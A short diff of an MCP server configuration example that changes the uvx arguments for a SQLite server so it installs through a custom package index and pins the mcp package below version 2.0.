@@ -22,7 +22,7 @@ Snowflake — it just sees `read_query`, `list_tables`, etc.
   "mcpServers": {
     "shopflow-sqlite": {
       "command": "uvx",
-      "args": ["mcp-server-sqlite", "--db-path", "${SHOPFLOW_DB}"],
+      "args": ["--default-index", "https://packagefeedproxy.microsoft.io/pypi/simple/", "--with", "mcp<2.0", "mcp-server-sqlite", "--db-path", "${SHOPFLOW_DB}"],
       "transport": "stdio"
     }
   }
